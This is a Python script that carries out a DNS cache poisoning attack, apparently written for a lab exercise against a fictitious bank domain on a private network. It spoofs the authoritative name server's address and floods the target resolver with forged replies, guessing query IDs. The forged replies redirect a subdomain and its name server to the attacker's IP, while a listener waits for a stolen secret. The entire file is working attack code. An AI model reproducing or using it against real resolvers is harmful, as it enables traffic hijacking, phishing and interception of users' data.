import socket
from dnslib import *
import multiprocessing


BADGUY_IP = "192.168.1.40" #my ip
UDP_PORT = 53
DNS_IP="192.168.1.121" #
SECRET_PORT = 1337

def get_qid_and_port():
	# GET PORT AND QUERY ID
	#SEND SOCKET
	socket_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	socket_send.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	socket_send.connect((DNS_IP, 53))
	#RECEIVE SOCKET
	socket_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	socket_receive.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	socket_receive.bind((BADGUY_IP, 53))
	#QUERY PACKET
	query = DNSRecord(DNSHeader(ra=1), q=DNSQuestion("badguy.ru"))
	socket_send.send(query.pack())
	socket_send.close()

 	data, (host, src_port) = socket_receive.recvfrom(2048)
	data = DNSRecord.parse(data)
	qid = data.header.id
	socket_receive.close()
	#print "QUERY ID: %s ; SOURCE PORT: %s" % (qid, src_port)
	return (qid, src_port)


def get_ns():
	#GET NAME SERVER
	socket_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	socket_send.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	socket_send.connect((DNS_IP, 53))
	query_ns = DNSRecord(DNSHeader(ra=1), q=DNSQuestion("ns.bankofallan.co.uk",QTYPE.NS)) #QUERY PACKET
	socket_send.send(query_ns.pack())

	data, address = socket_send.recvfrom(2048)
	data = DNSRecord.parse(data)
	ns = str(data.get_a().rdata)
	socket_send.close()
	#print "The name server for ns.bankofallan.co.uk is at %s" % ns
	#print
	return ns


def listening():
	#LISTEN ON PORT 1337 AND WAIT FOR THE SECRET
	final_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	final_socket.bind((BADGUY_IP, SECRET_PORT))
	print "Listening on port %s, waiting for secret..." % SECRET_PORT
	print
	while True:
		data, address = final_socket.recvfrom(2048)
		print "  Secret received:", data
		break



def poisoning():
	#CACHE POISONING
	qid, port = get_qid_and_port()
	ns = get_ns()
	sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock_send.connect((DNS_IP, 53))
	domain = "random.bankofallan.co.uk"
	while True:
		#SOCKET WITH SPOOFED IP ADDRESS
		sock_spoof = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock_spoof.bind((ns, 53))
		sock_spoof.connect((DNS_IP, port))
		#DNS LOOKUP REQUEST FOR DOMAIN
		query = DNSRecord(DNSHeader(ra=1), q=DNSQuestion(domain))
		sock_send.send(query.pack())
		#GENERATE FORGED RESPONSES AND TRY SEVERAL QUERY ID
		for i in range(0,50):
			q_id = qid + i
			query = DNSRecord(DNSHeader(qr=1,ra=1,id=q_id,aa=1), q=DNSQuestion(domain))
			answer = query.reply()
			answer.add_answer(RR(domain,QTYPE.A,rdata=A(BADGUY_IP),ttl=4800))
			answer.add_auth(RR(domain,QTYPE.NS,rdata=NS("ns.mydomain.ru"),ttl=4800))
			answer.add_ar(RR("ns.mydomain.ru",QTYPE.A,rdata=A(BADGUY_IP),ttl=4800))
			sock_spoof.send(answer.pack())
		#GET NEW QUERY ID AND TRY AGAIN
		qid, port = get_qid_and_port()

if __name__=="__main__":
	p1 = multiprocessing.Process(target=poisoning)
	p1.start()


	p2 = multiprocessing.Process(target=listening)
	p2.start()

	p1.join()
	p2.join()
